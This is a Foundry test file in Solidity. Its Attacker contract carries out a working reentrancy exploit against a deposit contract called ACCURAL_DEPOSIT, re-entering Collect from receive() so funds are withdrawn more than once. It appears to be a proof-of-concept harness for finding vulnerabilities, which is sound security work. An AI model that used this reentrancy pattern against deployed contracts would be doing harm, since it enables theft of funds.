
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {ACCURAL_DEPOSIT} from "../src/ACCURAL_DEPOSIT.sol";
import {LogFile} from "../src/LogFile.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {
    using stdStorage for StdStorage;
    
    ACCURAL_DEPOSIT public _contractUnderTest;
    LogFile public _logFile;
    
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new ACCURAL_DEPOSIT();
        
        // Initialize contract settings before locking
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(0.01 ether); // Lower MinSum for testing
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 0.01 ether && attackVal <= type(uint128).max);
        vm.assume(attackVal * 3 <= address(this).balance);
        
        // Fund the Victim contract (needs enough ETH for reentrant calls)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Test Contract (for funding attacker)
        vm.deal(address(this), attackVal * 3);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal * 3);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = ACCURAL_DEPOSIT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit to establish balance
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        storedAttackVal = val;
        initialSnapshot = address(this).balance;
        
        // Call Collect to start attack
        _victim.Collect(val);
        
        // Verify we withdrew more than once
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter Collect
            _victim.Collect(storedAttackVal);
        }
    }
}
